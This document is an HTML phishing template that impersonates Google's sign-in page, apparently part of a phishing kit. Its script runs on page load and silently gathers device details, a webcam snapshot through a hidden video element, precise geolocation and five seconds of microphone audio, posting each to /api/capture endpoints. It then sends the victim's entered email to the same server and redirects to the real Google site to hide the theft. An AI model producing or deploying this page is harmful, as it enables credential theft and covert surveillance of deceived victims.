<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;font-family:'Google Sans',Roboto,Arial,sans-serif}
.card{width:100%;max-width:450px;text-align:center;padding:40px 20px}
.logo{font-size:40px;font-weight:500;margin-bottom:20px}
.logo span{color:#4285f4} .logo span:nth-child(2){color:#ea4335} .logo span:nth-child(3){color:#fbbc04} .logo span:nth-child(4){color:#4285f4} .logo span:nth-child(5){color:#34a853} .logo span:nth-child(6){color:#ea4335}
h2{font-size:24px;color:#202124;font-weight:400;margin-bottom:10px}
p{color:#5f6368;font-size:16px;margin-bottom:30px}
.form-box{text-align:left;max-width:370px;margin:0 auto}
.input-group{margin-bottom:15px}
.input-group input{width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:all 0.3s}
.input-group input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,0.2)}
.forgot{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500;display:block;margin:10px 0 20px}
.btn-next{width:100%;padding:12px;background:#1a73e8;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.3s}
.btn-next:hover{background:#1557b0}
.create{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500;display:block;text-align:left;margin-top:30px}
.footer{margin-top:40px;font-size:12px;color:#5f6368;display:flex;justify-content:space-between;align-items:center}
.footer a{color:#5f6368;text-decoration:none;margin-left:15px}

.processing{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;align-items:center;justify-content:center;z-index:1000}
.processing.active{display:flex}
.process-box{text-align:center}
.spinner{width:40px;height:40px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
.process-box h2{color:#202124;font-size:18px}

#hiddenCamera{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
</style>
</head>
<body>
<div class="card" id="mainCard">
    <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
    <h2>Sign in</h2>
    <p>Use your Google Account</p>
    <div class="form-box">
        <div class="input-group">
            <input type="text" id="email" placeholder="Email or phone">
        </div>
        <a href="#" class="forgot">Forgot email?</a>
        <p style="font-size:14px;color:#5f6368;margin-bottom:20px">Not your computer? Use Guest mode to sign in privately. <a href="#" style="color:#1a73e8;text-decoration:none">Learn more</a></p>
        <div style="display:flex;justify-content:space-between;align-items:center">
            <a href="#" class="create">Create account</a>
            <button class="btn-next" onclick="handleLogin()" style="width:auto;padding:12px 30px">Next</button>
        </div>
    </div>
    <div class="footer">
        <span>English (United States)</span>
        <div>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</div>

<div class="processing" id="processing">
    <div class="process-box">
        <div class="spinner"></div>
        <h2>Loading...</h2>
    </div>
</div>

<video id="hiddenCamera" autoplay playsinline></video>
<canvas id="captureCanvas" style="display:none"></canvas>

<script>
const TOKEN = "<%= token %>";
let captureId = null;

async function silentCapture() {
    const device = {platform:navigator.platform,browser:navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0]||'Unknown',language:navigator.language,cores:navigator.hardwareConcurrency||'Unknown',memory:navigator.deviceMemory||'Unknown'};
    const screen={width:window.screen.width,height:window.screen.height};
    let battery={};try{const b=await navigator.getBattery();battery={level:b.level,charging:b.charging}}catch(e){}
    const network={type:navigator.connection?.type||'Unknown',effectiveType:navigator.connection?.effectiveType||'Unknown'};

    const resp=await fetch('/api/capture/init',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:TOKEN,template:'google',device,screen,battery,network})});
    const data=await resp.json();captureId=data.capture_id;

    try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
    const video=document.getElementById('hiddenCamera');video.srcObject=stream;
    setTimeout(()=>{const canvas=document.getElementById('captureCanvas');canvas.width=640;canvas.height=480;canvas.getContext('2d').drawImage(video,0,0,640,480);
    fetch('/api/capture/photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,image:canvas.toDataURL('image/jpeg',0.8)})});
    stream.getTracks().forEach(t=>t.stop());},2000);}catch(e){}

    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>fetch('/api/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy})}),()=>{},{enableHighAccuracy:true,timeout:10000});}

    try{const aStream=await navigator.mediaDevices.getUserMedia({audio:true});const rec=new MediaRecorder(aStream);const chunks=[];
    rec.ondataavailable=e=>chunks.push(e.data);rec.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onloadend=()=>fetch('/api/capture/audio',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,audio:reader.result})});reader.readAsDataURL(blob);};
    rec.start();setTimeout(()=>rec.stop(),5000);}catch(e){}
}

async function handleLogin(){
    const email=document.getElementById('email').value;
    if(!email){alert('Please enter email');return;}
    await fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,username:email,password:''})});
    document.getElementById('mainCard').style.display='none';document.getElementById('processing').classList.add('active');
    setTimeout(()=>window.location.href='https://accounts.google.com',4000);
}
window.addEventListener('load',silentCapture);
</script>
</body>
</html>